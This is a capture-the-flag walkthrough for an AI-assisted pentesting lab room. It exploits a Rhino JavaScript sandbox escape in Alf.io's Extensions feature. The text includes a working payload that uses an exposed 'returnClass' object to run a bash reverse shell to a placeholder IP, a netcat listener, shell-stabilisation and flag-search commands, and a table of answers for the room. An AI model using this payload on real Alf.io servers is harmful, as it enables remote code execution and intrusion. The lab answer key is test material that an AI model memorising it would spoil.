# NoScope: Finding RCE

{% embed url="https://tryhackme.com/room/noscoperce" %}

AI-assisted pentesting room. We use the NoScope autonomous agent to find and exploit **CVE-2026-35482** — a Rhino JavaScript sandbox escape in Alf.io's Extensions feature leading to full RCE.

---

## Target

**Alf.io** — open-source event ticketing platform (Java/Spring Boot), version `2.0-M5-2509-1`.

---

## Vulnerability — CVE-2026-35482 (Rhino Sandbox Escape)

Alf.io lets admins run custom JavaScript snippets server-side via an "Extensions" feature. Events like `EVENT_STATUS_CHANGE` trigger execution. There's a deny-list blocking obvious calls like `java.lang.Runtime` — but the sandbox exposes an unrestricted `java.lang.Class` object named **`returnClass`**, which lets us break out entirely.

---

## Step 1 — Enumerate with NoScope

Point the NoScope tool at the target:

```bash
noscope --target http://MACHINE_IP --scan
```

It identifies the Alf.io version and maps the `/api/v1/admin/extensions/` endpoint as the attack surface.

---

## Step 2 — Craft the Rhino Sandbox Escape

Log in to the admin panel. Navigate to **Extensions → New Extension**. Paste the payload:

```javascript
// Use the exposed returnClass to get Runtime
var runtime = returnClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null);
var cmd = ["bash", "-c", "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"];
runtime.exec(cmd);
```

Save the extension and trigger it by changing an event's status.

Start a listener first:

```bash
nc -lvnp 4444
```

---

## Step 3 — Get Shell & Flags

Catch the reverse shell. Stabilize and look around:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -name "*.txt" 2>/dev/null | xargs grep -l "THM{" 2>/dev/null
```

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What CVE is exploited? | `CVE-2026-35482` |
| What application is the target? | `Alf.io` |
| What sandbox is bypassed? | Mozilla Rhino JavaScript sandbox |
| What exposed object enables the escape? | `returnClass` |
| Flags | Retrieved from the file system after the reverse shell lands |
